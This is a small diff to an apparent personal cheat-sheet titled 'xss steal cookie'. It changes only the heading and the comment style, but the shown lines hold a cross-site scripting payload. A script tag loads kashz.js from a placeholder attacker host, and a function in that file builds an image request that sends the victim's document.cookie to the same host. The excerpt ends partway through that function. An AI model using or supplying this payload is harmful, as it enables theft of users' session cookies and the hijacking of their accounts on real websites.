@@ -1,10 +1,10 @@
-# xss-steal-cookie
+# xss steal cookie
 
 ```javascript
-# request file using 
+// request file using 
 <script src='http://IP/kashz.js'> </script>
 
-# file: kashz.js
+// file: kashz.js
 function cookie1() {
     var img = document.createElement("img");
     img.src = "http://IP/?cookie=" + document.cookie;
